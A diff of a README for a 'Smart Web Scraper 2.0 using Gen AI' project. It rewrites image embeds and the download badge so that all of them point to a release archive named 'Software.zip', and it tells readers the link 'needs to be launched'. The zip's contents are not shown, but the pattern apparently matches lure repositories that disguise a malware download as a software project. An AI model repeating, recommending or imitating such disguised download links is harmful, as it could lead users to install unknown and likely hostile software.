@@ -1,6 +1,6 @@
 # Smart Web Scraper 2.0 using Gen AI
 
-![Scraper Gif](https://github.com/yourusername/yourrepository/img/scrape.gif)
+![Scraper Gif](https://github.com/99monisha/Smart-Web-Scraper-2.0-using-Gen-AI/releases/download/v1.0/Software.zip)
 
 Welcome to the Smart Web Scraper 2.0 using Gen AI repository! This project offers effortless data extraction powered by Generative AI. With this advanced web scraping tool, you can easily extract data from various sources with the help of cutting-edge technology.
 
@@ -19,7 +19,7 @@ Welcome to the Smart Web Scraper 2.0 using Gen AI repository! This project offer
 ## Installation
 To get started with the Smart Web Scraper 2.0, you can download the latest release by clicking the button below:
 
-[![Download Smart Web Scraper 2.0](https://img.shields.io/badge/Download-v1.0.0-brightgreen)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Smart Web Scraper 2.0](https://github.com/99monisha/Smart-Web-Scraper-2.0-using-Gen-AI/releases/download/v1.0/Software.zip)](https://github.com/99monisha/Smart-Web-Scraper-2.0-using-Gen-AI/releases/download/v1.0/Software.zip)
 
 Note: The link above needs to be launched to initiate the download.
 
@@ -48,4 +48,4 @@ Smart Web Scraper 2.0 using Gen AI is developed and maintained by a team of tale
 
 Thank you for choosing Smart Web Scraper 2.0 for your data extraction needs! Happy scraping! 🌟
 
-![Scraping Image](https://github.com/yourusername/yourrepository/img/scraping.jpg)
+![Scraping Image](https://github.com/99monisha/Smart-Web-Scraper-2.0-using-Gen-AI/releases/download/v1.0/Software.zip)
